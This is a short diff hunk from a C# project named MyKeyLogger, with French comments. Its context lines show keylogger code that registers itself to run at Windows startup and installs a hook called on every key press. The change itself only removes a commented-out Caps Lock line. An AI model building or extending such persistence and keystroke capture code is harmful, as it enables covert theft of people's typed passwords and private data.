@@ -231,9 +231,6 @@ namespace MyKeyLogger
         {        	
 	        // Exécute l'application automatiquement au démarrage de Windows 10
             AddApplicationToStartup();
-        	
-            // Désactive la touche Ver.Maj du clavier
-            //OperationKey.TurnOFFCapsLockKey();
             
             // Defnit une fonction de rappel qui sera appelée à chaque pression de touche.
             hookID = SetHook(proc);
